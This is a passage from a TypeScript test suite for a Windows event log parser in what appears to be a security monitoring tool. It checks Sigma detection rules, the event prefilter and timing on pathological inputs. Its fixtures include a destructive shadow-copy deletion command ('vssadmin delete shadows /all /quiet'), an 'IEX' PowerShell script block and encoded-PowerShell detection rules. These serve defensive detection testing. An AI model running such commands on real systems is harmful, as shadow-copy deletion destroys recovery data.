      windowsEvent(4104, WINDOWS_PROVIDERS.powerShell, "Microsoft-Windows-PowerShell/Operational", [
        ["ScriptBlockText", "IEX"],
      ], { level: "Warning" }),
    );

    expect(parse(xml)).toHaveLength(1);
  });
});

describe("WindowsEventLogParser - what stays a log", () => {
  test.each([
    [4634, SECURITY, "a logoff"],
    [4672, SECURITY, "special privileges assigned to a logon"],
    [4768, SECURITY, "a Kerberos ticket granted"],
    [4769, SECURITY, "a Kerberos service ticket"],
    [4776, SECURITY, "an NTLM validation"],
    [5156, SECURITY, "a connection the firewall allowed"],
    [7036, WINDOWS_PROVIDERS.serviceControlManager, "a service starting"],
    [1000, "Application Error", "an application crash"],
  ])("%s from %s (%s) is not an event", (eventId: number, provider: string) => {
    expect(
      parse(
        collectorOtlpBody(
          windowsEvent(eventId, provider, "Security", [["TargetUserName", "alice"]]),
        ),
      ),
    ).toEqual([]);
  });

  test("lines that are not Windows events are not read", () => {
    for (const body of [
      "",
      "plain text",
      "{}",
      '{"EventID":4625}',
      '{"SourceName":"Microsoft-Windows-Security-Auditing"}',
      '{"EventID":"x","SourceName":"Microsoft-Windows-Security-Auditing"}',
      '{"EventID":70000,"SourceName":"Microsoft-Windows-Security-Auditing"}',
      "<Event><EventID>4625</EventID></Event>",
      "[1,2,3]",
      "{not json",
    ]) {
      expect({ body, events: parse(body) }).toEqual({ body, events: [] });
    }
  });
});

describe("WindowsEventLogParser - rules read the events as Windows names them", () => {
  function rule(yaml: string): SigmaRule {
    return SigmaRuleParser.parse(yaml);
  }

  test("a SigmaHQ-style rule on EventID and LogonType matches a failed RDP sign-in", () => {
    const sigma: SigmaRule = rule(`title: Failed RDP logon
detection:
  selection:
    EventID: 4625
    LogonType: 10
  condition: selection
`);

    expect(
      sigmaRuleMatchesEvent(sigma, viaCollector(failedSignIn({ LogonType: "10" }))),
    ).toBe(true);
    expect(
      sigmaRuleMatchesEvent(sigma, viaCollector(failedSignIn({ LogonType: "3" }))),
    ).toBe(false);
  });

  test("a rule on Image and CommandLine reads a Windows process launch", () => {
    const sigma: SigmaRule = rule(`title: PowerShell launched by cmd
detection:
  selection:
    Image|endswith: '\\powershell.exe'
    ParentImage|endswith: '\\cmd.exe'
    CommandLine|contains: ' -enc '
  condition: selection
`);

    expect(sigmaRuleMatchesEvent(sigma, viaCollector(processCreated()))).toBe(true);
  });

  function libraryRule(title: string): SigmaRule {
    const entry: DetectionRuleLibraryEntry | undefined =
      DETECTION_RULE_LIBRARY.find((candidate: DetectionRuleLibraryEntry) => {
        return candidate.title === title;
      });

    expect(entry).toBeDefined();

    return SigmaRuleParser.parse(entry!.sigmaRuleYaml);
  }

  test("the library's endpoint rules fire on Windows' own process events", () => {
    expect(
      sigmaRuleMatchesEvent(
        libraryRule("Encoded PowerShell command"),
        viaCollector(processCreated()),
      ),
    ).toBe(true);
    expect(
      sigmaRuleMatchesEvent(
        libraryRule("Shadow copies deleted"),
        viaCollector(
          processCreated({
            NewProcessName: "C:\\Windows\\System32\\vssadmin.exe",
            CommandLine: "vssadmin.exe delete shadows /all /quiet",
          }),
        ),
      ),
    ).toBe(true);
  });

  test("the library's sign-in rules count Windows' failed sign-ins", () => {
    expect(
      sigmaRuleMatchesEvent(
        libraryRule("Brute force from one IP address"),
        viaCollector(failedSignIn()),
      ),
    ).toBe(true);
  });
});

/*
 * The log scan asks the database only for lines its prefilter lets
 * through: every event this parser makes must come from such a line, and
 * the noisy successful sign-ins are kept out there already.
 */
describe("WindowsEventLogParser - the prefilter", () => {
  const KEPT: Array<[string, WindowsEventSpec]> = [
    ["4625", failedSignIn()],
    ["4624 type 10", successfulSignIn()],
    ["4688", processCreated()],
    [
      "4732",
      windowsEvent(4732, SECURITY, "Security", [["TargetUserName", "Administrators"]]),
    ],
    [
      "1102",
      windowsEvent(1102, WINDOWS_PROVIDERS.eventLog, "Security", [], {
        userData: { name: "LogFileCleared", fields: [["SubjectUserName", "a"]] },
      }),
    ],
    [
      "7045",
      windowsEvent(7045, WINDOWS_PROVIDERS.serviceControlManager, "System", [
        ["ServiceName", "x"],
      ]),
    ],
    [
      "Sysmon 1",
      windowsEvent(1, SYSMON, "Microsoft-Windows-Sysmon/Operational", [
        ["Image", "C:\\a.exe"],
      ]),
    ],
    [
      "Defender 1116",
      windowsEvent(1116, DEFENDER, "Microsoft-Windows-Windows Defender/Operational", []),
    ],
    [
      "PowerShell 4104",
      windowsEvent(4104, WINDOWS_PROVIDERS.powerShell, "Microsoft-Windows-PowerShell/Operational", [
        ["ScriptBlockText", "IEX"],
      ], { level: "Warning" }),
    ],
  ];

  const CASES: Array<[string, string, string]> = KEPT.flatMap(
    ([name, spec]: [string, WindowsEventSpec]): Array<[string, string, string]> => {
      return NAMED_SHAPES.map(
        ([shape, render]: [WindowsShape, (spec: WindowsEventSpec) => string]): [
          string,
          string,
          string,
        ] => {
          return [name, shape, render(spec)];
        },
      );
    },
  );

  test.each(CASES)(
    "%s sent as %s is an event and passes the prefilter",
    (_name: string, _shape: string, body: string) => {
      expect(parse(body).length).toBeGreaterThan(0);
      expect(matchesSecurityLogPrefilter(body)).toBe(true);
    },
  );

  const NOISY: Array<[string, string, string]> = NOISY_LOGON_TYPES.flatMap(
    (logonType: string): Array<[string, string, string]> => {
      return NAMED_SHAPES.map(
        ([shape, render]: [WindowsShape, (spec: WindowsEventSpec) => string]): [
          string,
          string,
          string,
        ] => {
          return [logonType, shape, render(successfulSignIn({ LogonType: logonType }))];
        },
      );
    },
  );

  test.each(NOISY)(
    "a successful logon of type %s sent as %s never leaves the database",
    (_logonType: string, _shape: string, body: string) => {
      expect(matchesSecurityLogPrefilter(body)).toBe(false);
      expect(parse(body)).toEqual([]);
    },
  );

  test("each provider's group asks for exactly the ids the parser reads", () => {
    const security: Array<string> = getWindowsEventIds(SECURITY);

    expect(security).toContain("4624");
    expect(WINDOWS_PREFILTER_GROUPS[0]!.anyOf).toEqual(
      security.filter((id: string): boolean => {
        return id !== "4624";
      }),
    );
    expect(WINDOWS_PREFILTER_GROUPS[1]!.anyOf).toEqual(["4624"]);

    for (const group of WINDOWS_PREFILTER_GROUPS) {
      for (const word of [group.requires, ...group.anyOf, ...(group.noneOf || [])]) {
        expect(word).toBe(word.toLowerCase());
      }
    }
  });

  test("a logon type's markers name its exact value, never the start of a longer one", () => {
    for (const marker of logonTypeMarkers("3")) {
      expect(marker.includes("3")).toBe(true);
    }

    const rdp: string = collectorOtlpBody(successfulSignIn({ LogonType: "10" }));

    for (const logonType of NOISY_LOGON_TYPES) {
      for (const marker of logonTypeMarkers(logonType)) {
        expect({ marker, inRdpLine: rdp.toLowerCase().includes(marker) }).toEqual({
          marker,
          inRdpLine: false,
        });
      }
    }
  });

  test("the whole log parser reads a Windows line as a Windows event, once", () => {
    const events: Array<NormalizedSecurityEvent> = SecurityLogParser.parse(
      logLine(collectorOtlpBody(failedSignIn())),
    );

    expect(events).toHaveLength(1);
    expect(events[0]!.attributes[SECURITY_LOG_FORMAT_ATTRIBUTE]).toBe(
      SecurityLogFormat.WindowsEvents,
    );
  });
});

/*
 * Event logs are written by anyone who can run a program: the time to read
 * one must grow in line with it.
 */
describe("WindowsEventLogParser - long lines", () => {
  const MANY: number = 20000;

  const SHAPES: Array<[string, string]> = [
    [
      "an XML event with thousands of fields",
      `<Event><System><Provider Name='${SECURITY}'/><EventID>4625</EventID></System><EventData>${"<Data Name='x'>y</Data>".repeat(MANY)}</EventData></Event>`,
    ],
    [
      "an XML event whose fields never close",
      `<Event><System><Provider Name='${SECURITY}'/><EventID>4625</EventID></System><EventData>${"<Data Name='x'>".repeat(MANY)}</EventData></Event>`,
    ],
    [
      "an XML event of entities",
      `<Event><System><Provider Name='${SECURITY}'/><EventID>4625</EventID></System><EventData><Data Name='TargetUserName'>${"&amp;&#65;&bogus;".repeat(MANY)}</Data></EventData></Event>`,
    ],
    [
      "a collector body of thousands of fields",
      collectorOtlpBody(
        windowsEvent(
          4625,
          SECURITY,
          "Security",
          Array.from({ length: 5000 }, (_value: unknown, index: number): [string, string] => {
            return [`F${index}`, "v"];
          }),
        ),
      ),
    ],
    [
      "a deeply nested collector value",
      `{"kvlistValue":{"values":[${'{"key":"a","value":{"kvlistValue":{"values":['.repeat(2000)}${"]}}}".repeat(2000)}]}}`,
    ],
  ];

  test.each(SHAPES)("%s", (_name: string, body: string) => {
    const run: FastestRun<number> = fastestRun({
      run: (): number => {
        return WindowsEventLogParser.parse(logLine(body)).length;
      },
      limitInMs: 2000,
    });

    expect(run.inMs).toBeLessThan(2000);
  });
});
